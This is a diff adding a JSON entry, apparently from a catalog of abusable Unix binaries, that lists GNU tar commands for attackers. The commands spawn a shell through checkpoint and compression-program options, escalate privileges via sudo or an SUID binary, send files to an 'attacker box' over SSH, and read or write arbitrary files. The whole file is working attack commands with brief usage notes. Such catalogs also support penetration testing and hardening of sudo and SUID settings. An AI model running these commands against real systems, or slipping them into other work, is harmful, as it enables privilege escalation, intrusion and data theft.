@@ -1,0 +1,51 @@
+{
+  "functions": {
+    "shell": [
+      {
+        "code": "tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"
+      },
+      {
+        "description": "This only works for GNU tar.",
+        "code": "tar xf /dev/null -I '/bin/sh -c \"sh <&2 1>&2\"'"
+      },
+      {
+        "description": "This only works for GNU tar. It can be useful when only a limited command argument injection is available.",
+        "code": "TF=$(mktemp)\necho '/bin/sh 0<&1' > \"$TF\"\ntar cf \"$TF.tar\" \"$TF\"\ntar xf \"$TF.tar\" --to-command sh\nrm \"$TF\"*\n"
+      }
+    ],
+    "file-upload": [
+      {
+        "description": "This only works for GNU tar. Create tar archive and send it via SSH to a remote location. The attacker box must have the 'rmt' utility installed (it should be present by default in Debian-like distributions).",
+        "code": "tar cvf [user@host]:[destination_file] [source_file] --rsh-command=/bin/ssh\n"
+      }
+    ],
+    "file-download": [
+      {
+        "description": "This only works for GNU tar. Download and extract a tar archive via SSH. The attacker box must have the 'rmt' utility installed (it should be present by default in Debian-like distributions).",
+        "code": "tar xvf [user@host]:[file] --rsh-command=/bin/ssh\n"
+      }
+    ],
+    "file-write": [
+      {
+        "description": "This only works for GNU tar.",
+        "code": "TF=$(mktemp)\necho DATA > \"$TF\"\ntar c --xform \"s@.*@[file]@\" -OP \"$TF\" | tar x -P\n"
+      }
+    ],
+    "file-read": [
+      {
+        "description": "This only works for GNU tar.",
+        "code": "tar xf [file] -I '/bin/sh -c \"cat 1>&2\"'\n"
+      }
+    ],
+    "sudo": [
+      {
+        "code": "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"
+      }
+    ],
+    "limited-suid": [
+      {
+        "code": "./tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"
+      }
+    ]
+  }
+}
